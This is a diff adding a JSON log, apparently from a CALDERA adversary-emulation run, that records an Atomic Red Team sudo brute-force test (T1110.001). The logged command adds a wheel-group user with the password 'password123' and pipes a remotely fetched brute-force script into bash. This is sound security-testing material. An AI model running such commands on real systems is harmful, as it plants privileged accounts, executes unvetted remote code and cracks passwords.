@@ -1,0 +1,42 @@
+[
+  {
+    "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash",
+    "plaintext_command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash",
+    "delegated_timestamp": "2026-07-12T05:10:03Z",
+    "collected_timestamp": "2026-07-12T05:10:28Z",
+    "finished_timestamp": "2026-07-12T05:10:53Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 2451,
+    "agent_metadata": {
+      "paw": "dahkcz",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/caldagent",
+      "pid": 1957,
+      "ppid": 1711,
+      "privilege": "User",
+      "host": "ubuntu-vb",
+      "contact": "HTTP",
+      "created": "2026-07-12T04:59:30Z"
+    },
+    "ability_metadata": {
+      "ability_id": "3f4dd4cffe51d21011fbe98bd2c00c09",
+      "ability_name": "SUDO Brute Force - Redhat",
+      "ability_description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n"
+    },
+    "operation_metadata": {
+      "operation_name": "brute force - Credential Access T1110 (2026-07-12T05:10:03.786Z)",
+      "operation_start": "2026-07-12T05:10:03Z",
+      "operation_adversary": "brute force - Credential Access T1110"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Brute Force: Password Guessing",
+      "technique_id": "T1110.001"
+    },
+    "agent_reported_time": "2026-07-12T05:10:36Z"
+  }
+]
